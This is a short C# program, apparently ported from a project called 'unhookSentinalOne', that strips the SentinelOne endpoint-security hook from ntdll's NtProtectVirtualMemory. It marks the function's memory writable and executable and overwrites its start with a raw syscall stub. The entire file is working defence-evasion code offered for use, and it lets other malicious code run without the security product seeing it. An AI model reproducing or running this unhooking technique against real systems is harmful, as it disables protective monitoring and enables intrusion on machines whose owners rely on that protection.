////c# port from mrun1k0d3rs unhookSentinalOne project.

using System;
using System.Runtime.InteropServices;

namespace SentinelOneCleanup
{
    class Program
    {
        [DllImport("ntdll.dll")]
        private static extern IntPtr NtProtectVirtualMemory(IntPtr hDll, IntPtr id, ref uint dwSize, uint flNewProtect, out uint lpflOldProtect);

       
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        private static readonly byte[] patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3 };

        static void Main(string[] args)
        {
            CleanUp();
        }

        static void CleanUp()
        {
            IntPtr hDll = LoadLibrary("ntdll.dll");
            IntPtr NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");

            PatchHook(NtProtectVirtualMemory, 0x50, 0x00);

            CloseHandle(hDll);
        }

        static void PatchHook(IntPtr address, byte id, byte high)
        {
            uint dwSize = 11;
            IntPtr patch_address = address;

            patch[4] = id;
            patch[5] = high;
            patch[6] = (byte)(high ^ high);
            patch[7] = (byte)(high ^ high);

            uint dwOld;
            VirtualProtect(patch_address, dwSize, 0x40, out dwOld);
            Marshal.Copy(patch, 0, patch_address, patch.Length);
        }
    }
}
